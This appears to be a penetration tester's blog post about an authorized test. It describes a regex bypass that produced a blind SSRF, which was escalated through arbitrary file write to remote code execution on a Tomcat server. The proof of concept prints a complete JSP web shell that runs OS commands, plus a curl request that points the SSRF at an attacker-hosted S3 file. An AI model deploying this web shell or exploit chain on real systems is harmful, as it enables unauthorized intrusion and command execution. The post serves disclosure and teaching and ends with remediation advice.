---
title:  "From Blind SSRF to RCE: How Source Code Review Exposed a Critical Exploit Chain"
layout: post
date:   2026-03-31
---

On a recent engagement, a client requested a penetration test on a large-scale web application (~3 GB of source code, scoped for 200 hours). To accelerate vulnerability discovery, the client provided full access to the application's source code.

Having spent several years as a Java developer, I approached this assessment with a strong understanding of common design patterns, frameworks, and typical pitfalls. The source code environment was restricted—no Internet access and no specialized security tooling, only PowerShell and Java IDEs such as IntelliJ.  Despite these constraints, manual review proved highly effective.

## Why Source Code Review Matters
While dynamic testing and automated scanners are valuable, they often miss issues that require contextual understanding. Source code review allows you to:
 - Identify hidden or unused endpoints
 - Understand implicit trust relationships between components
 - Detect flawed assumptions in input validation
 - Trace data flows across application layers

This engagement provided a clear example of those advantages.

## Discovering the Vulnerable Endpoint
During the review, I focused on *Controller.java files, as these typically expose API endpoints. One endpoint stood out: `/ui/redacted/downloadRedactedLogs`

This endpoint appeared to be unused within the application, yet it was accessible to low-privileged users. The endpoint allowed users to download a ZIP file containing the web server logs.

The endpoint accepted a `hostname` parameter, which was used to send an HTTP request to an internal server responsible for retrieving the logs. 

To download the web server logs, the application relied on an internal client domain. Luckily for me, the internal web server domain was exposed in every HTTP response as a custom header: `X-Redacted-Domain: internal-webserver-domain.com`

## Root Cause: Bypassing the Regular Expression
The application attempted to restrict the `hostname` parameter using a regular expression, allowing only domains owned by the client.

At first glance, this appeared secure. However, the expression only ensured that an approved domain appeared at the end of the input string. Because the preceding portion for subdomains allowed special characters, the restriction could be bypassed by injecting `?` or `#`:
 - `?` converts the allowed domain into a query string (e.g. attacker.com/path?allowed.client-domain.com)
 - `#` converts the allowed domain into a fragment (e.g. attacker.com/path#allowed.client-domain.com)

As a result, the input passed validation, but the actual request was sent to an attacker-controlled or internal server. This led to a Server-Side Request Forgery (SSRF) vulnerability.

## SSRF Limitations
By exploiting this flaw, I was able to trigger server-side HTTPS requests to arbitrary hosts. However, exploitation was limited: the application only supported HTTPS and expected responses in a specific JSON format. If the response did not match the JSON format, a generic JSON response was returned to the user instead of the expected ZIP file. This meant the SSRF was blind.

## From Blind SSRF to Remote Code Execution
Code review revealed that the application trusted the returned JSON response from the internal service and used it to construct ZIP file contents. File paths were defined as JSON keys, with file contents as values. The application would create these files on disk before packaging them into a ZIP for the user.

If an attacker could control this JSON via SSRF, they could perform an **arbitrary file write**.

By analyzing the source code and downloaded web server logs from earlier, I identified the Tomcat webroot path. This allowed me to write a JSP file directly to a web-accessible directory, ultimately achieving remote code execution.

### Proof of Concept
1. Uploaded the following JSON file to an S3 bucket.
   ```json
   {
    "serverResult": {
        "payload": {
            "zipContent": {
                "/usr/local/apache-tomcat/redacted/webapps/ROOT/cyberadvisors2.jsp": "<%@ page import=\"java.util.*,java.io.*\"%><HTML><BODY><FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\"><INPUT TYPE=\"text\" NAME=\"cmd\"><INPUT TYPE=\"submit\" VALUE=\"Send\"></FORM><pre><% if (request.getParameter(\"cmd\") != null) { out.println(\"Command: \" + request.getParameter(\"cmd\") + \"<BR>\"); Process p = Runtime.getRuntime().exec(request.getParameter(\"cmd\")); OutputStream os = p.getOutputStream(); InputStream in = p.getInputStream(); DataInputStream dis = new DataInputStream(in); String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine(); } } %></pre></BODY></HTML>"
            }
        }
    }
   }
   ```

   <figure>
     <img src="/assets/images/2026/ssrf-to-rce-1.png">
     <figcaption>Figure 1 – JSON file on the S3 bucket to write the JSP shell</figcaption>
   </figure>
   
2. Called the endpoint pointing to the S3 bucket and JSON file to trigger the file write.
   ```bash
   curl -i -H 'X-Token: :csrfToken' -b 'RedactedSessionCookieName=:SessionCookieValue' 'https://redacted.com/ui/redacted/downloadRedactedLogs?threadId=1&hostname=s3.amazonaws.com/redacted/ssrf-response.json%3ftest.client-domain.com&fromOtherJvm=true'
   ```

   <figure>
     <img src="/assets/images/2026/ssrf-to-rce-2.png">
     <figcaption>Figure 2 – Triggered the SSRF to write the JSP file</figcaption>
   </figure>
   
3. Sent an OS command using the JSP shell created on the server.
   <figure>
     <img src="/assets/images/2026/ssrf-to-rce-3.png">
     <figcaption>Figure 3 – Executed an OS command on the web server</figcaption>
   </figure>

## Remediation
The recommendations to the client were to restrict this endpoint to authorized internal users only and strengthen input validation to block unnecessary special characters before hostname whitelisting.
